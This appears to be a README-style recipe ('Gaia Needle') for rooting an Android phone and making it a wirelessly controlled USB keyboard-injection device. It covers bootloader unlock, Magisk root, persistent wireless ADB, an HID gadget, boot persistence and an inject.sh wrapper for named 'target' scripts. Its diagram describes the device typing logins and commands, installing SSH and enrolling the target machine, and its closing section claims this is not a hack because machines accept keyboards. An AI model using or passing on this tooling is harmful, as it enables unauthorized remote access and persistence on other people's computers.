# Gaia Needle — Replicable Recipe

**How to turn any Android device into a sovereign wireless USB injection vector.**

This is the complete, step-by-step recipe. Follow it exactly on any compatible device.

---

## Ingredients

- 1× Android phone with USB-C (Pixel 8a tested, any with USB gadget kernel support)
- 1× Computer on the same WiFi (the "control machine")
- USB-C cable (for initial setup, then wireless only)
- Android SDK Platform Tools (adb, fastboot)
- Magisk APK (v30.6+) — https://github.com/topjohnwu/Magisk/releases
- ~30 minutes of patience

## Phase 0: Prepare

```bash
# Install ADB/fastboot on control machine
# Debian/Ubuntu:
sudo apt install android-tools-adb android-tools-fastboot

# Or download: https://developer.android.com/studio/releases/platform-tools

# Enable Developer Options on phone:
# Settings → About Phone → Tap "Build number" 7 times
# Settings → System → Developer Options → Enable "USB debugging"
# Settings → System → Developer Options → Enable "OEM unlocking"

# Connect phone via USB-C, authorize ADB
adb devices  # Should show your device
```

## Phase 1: Unlock Bootloader

⚠️ **This wipes the device.** Back up anything important first.

```bash
adb reboot bootloader
# Device enters fastboot mode

fastboot flashing unlock
# On device: use volume buttons to select "Unlock" → power button to confirm
# Device wipes and reboots

# After reboot: re-enable Developer Options + USB debugging again
```

## Phase 2: Install Magisk (Root)

```bash
# Download Magisk APK (v30.6 or later)
wget https://github.com/topjohnwu/Magisk/releases/download/v30.6/Magisk-v30.6.apk

# Install on device
adb install Magisk-v30.6.apk
```

### Method A: Direct Install (if Magisk supports your device's ramdisk)

1. Open Magisk app on phone
2. Tap "Install" on the Magisk card (not the App card)
3. Select "Direct Install (Recommended)"
4. Reboot when prompted

### Method B: Patch and Flash (GrapheneOS, custom ROMs)

1. Get your ROM's `init_boot.img` (or `boot.img` for older devices)
   - Extract from your OTA zip: `unzip ota.zip init_boot.img`
   - Or download from your ROM's release page
2. Push to device: `adb push init_boot.img /sdcard/Download/`
3. Open Magisk app → Install → "Select and Patch a File"
4. Select the `init_boot.img` from Downloads
5. Pull the patched image back:
   ```bash
   adb pull /sdcard/Download/magisk_patched-*.img ./magisk-patched.img
   ```
6. Flash it:
   ```bash
   adb reboot bootloader
   fastboot flash init_boot magisk-patched.img
   # Or for boot partition: fastboot flash boot magisk-patched.img
   fastboot reboot
   ```

### Verify Root

```bash
# After reboot, open Magisk app — should show "Installed" with version
# Then enable ADB root:
#   Magisk Settings → Superuser Access → "Apps and ADB"

# Test from computer:
adb shell su -c id
# Should show: uid=0(root)
```

**Note:** `su` location varies by ROM:
- GrapheneOS: `/debug_ramdisk/su`
- Most others: `/system/bin/su` or just `su`

Find it: `adb shell "find / -name su -type f 2>/dev/null"`

## Phase 3: Enable Persistent Wireless ADB

```bash
# Set su path for your ROM
SU="su"  # or "/debug_ramdisk/su" for GrapheneOS

# Enable wireless ADB permanently
adb shell "$SU -c 'setprop persist.adb.tcp.port 5555'"
adb shell "$SU -c 'settings put global adb_wifi_enabled 1'"

# Get device WiFi IP
adb shell ip addr show wlan0 | grep "inet "
# Example output: inet 192.168.9.217/24

# Connect wirelessly
adb connect 192.168.9.217:5555

# Unplug USB — you're now wireless
adb -s 192.168.9.217:5555 shell echo "WIRELESS OK"
```

## Phase 4: Setup USB HID Keyboard Gadget

The magic: turn the phone's USB-C port into a keyboard that any machine recognizes.

```bash
DEVICE="192.168.9.217:5555"  # your device's wireless ADB address
SU="/debug_ramdisk/su"       # adjust for your ROM

# Push the HID setup script
adb -s $DEVICE push hid-setup.sh /data/local/tmp/
adb -s $DEVICE shell "$SU -c 'chmod 755 /data/local/tmp/hid-setup.sh'"

# Run it
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/hid-setup.sh'"
# Should output: ✓ HID keyboard gadget active at /dev/hidg0
```

### Verify

```bash
adb -s $DEVICE shell "$SU -c 'ls -la /dev/hidg0'"
# Should show: crw------- ... /dev/hidg0
```

### What just happened

The phone now has TWO USB personalities:
1. Normal Android USB (data, charging, MTP)
2. USB HID Keyboard (new, our gadget)

When you plug the USB-C into another machine, that machine sees a keyboard.
You control the keyboard wirelessly from your control machine via ADB.

## Phase 5: Deploy Typing Scripts

```bash
DEVICE="192.168.9.217:5555"

# Push the keyboard emulator
adb -s $DEVICE push type.sh /data/local/tmp/
adb -s $DEVICE shell "$SU -c 'chmod 755 /data/local/tmp/type.sh'"

# Push target injection scripts
adb -s $DEVICE shell "mkdir -p /data/local/tmp/targets"
for f in targets/*.sh; do
    adb -s $DEVICE push "$f" "/data/local/tmp/targets/$(basename $f)"
done
adb -s $DEVICE shell "$SU -c 'chmod -R 755 /data/local/tmp/targets/'"
```

## Phase 6: Install Boot Persistence (Magisk Module)

Without this, you'd need to re-run hid-setup.sh after every reboot.

```bash
adb -s $DEVICE push persist-needle.sh /data/local/tmp/
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/persist-needle.sh'"
# ✓ Magisk module installed
```

The HID gadget now activates automatically on every boot.

## Phase 7: Test the Needle

```bash
DEVICE="192.168.9.217:5555"

# Open a text editor on YOUR computer, then:
# Plug the phone's USB-C into the target machine

# From control machine, type on the target:
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/type.sh \"hello from gaia\"'"

# You should see "hello from gaia" appear on the target's screen!

# More commands:
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/type.sh --line \"ls -la\"'"
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/type.sh --ctrl-alt-t'"
adb -s $DEVICE shell "$SU -c 'sh /data/local/tmp/type.sh --enter'"
```

## Phase 8: Inject a Target

```bash
# From control machine, using inject.sh wrapper:

# Custom target with speak-friend credentials:
NEEDLE_GATE=biomegate ./inject.sh 192.168.9.217:5555 --target speak-friend

# Or interactive mode — type directly:
./inject.sh 192.168.9.217:5555 --interactive
```

---

## Quick Reference

| Command | What it does |
|---------|-------------|
| `./deploy-needle.sh <device>` | Full setup: root verify, HID gadget, scripts, persistence |
| `./inject.sh <device> --target NAME` | Run a named injection script |
| `./inject.sh <device> --type "text"` | Type text on target |
| `./inject.sh <device> --line "cmd"` | Type command + Enter |
| `./inject.sh <device> --interactive` | Interactive typing mode |

## Troubleshooting

| Problem | Solution |
|---------|---------|
| `su: not found` | Find su: `adb shell "find / -name su 2>/dev/null"` |
| `Permission denied` on su | Magisk → Settings → Superuser Access → "Apps and ADB" |
| `/dev/hidg0` missing after reboot | Run `hid-setup.sh` or reinstall Magisk module |
| HID gadget not creating | Check kernel: `zgrep CONFIG_USB_CONFIGFS_F_HID /proc/config.gz` |
| Patched image too large | Update Magisk to v30.6+ (better compression) |
| Target doesn't see keyboard | Unplug/replug USB-C; ensure HID gadget is active |
| Wireless ADB disconnects | `adb connect <ip>:5555` — it reconnects instantly |

## Compatible Devices

The needle works on any Android device with:
- Unlockable bootloader
- USB gadget mode in kernel (CONFIG_USB_CONFIGFS_F_HID=y)
- USB-C (for USB OTG gadget mode)

Known working:
- **Google Pixel 8a** (Tensor G3, GrapheneOS Android 17) ✅
- Most Pixel devices (5 and later) should work
- OnePlus, Samsung with unlocked bootloader (needs testing)

Known NOT working:
- Devices with locked bootloader that can't be unlocked
- Some Samsung devices (Knox tripwire)
- USB-A only devices (no gadget mode)

## The Architecture

```
                     WiFi (any network)
    ┌─────────────────────────────────────────┐
    │                                         │
    ▼                                         │
┌──────────┐    wireless ADB     ┌──────────────────┐
│ Control   │ ──────────────────→│ Needle Device     │
│ Machine   │  (TCP port 5555)   │ (Pixel 8a)        │
│ (eastGate)│                    │                    │
└──────────┘                    │ ┌──────────────┐  │
                                │ │ Magisk (root) │  │
                                │ │ type.sh       │  │
                                │ │ /dev/hidg0    │  │
                                │ └──────┬───────┘  │
                                └────────┼──────────┘
                                         │ USB-C
                                         │ (HID keyboard)
                                         ▼
                                ┌──────────────────┐
                                │ Target Machine    │
                                │ (sees a keyboard) │
                                │                    │
                                │ Types login, cmds  │
                                │ Installs SSH       │
                                │ Joins the organism │
                                └──────────────────┘
```

## Philosophy

This is not a hack. This is not an exploit. This is a keyboard.

The target machine consents to keyboard input by design — it has a USB port, it accepts HID devices. We simply provide the keystrokes that a human would type, but from across the room, across the house, across the network.

The amoeba doesn't break in. It becomes the membrane.

Speak friend, and enter.
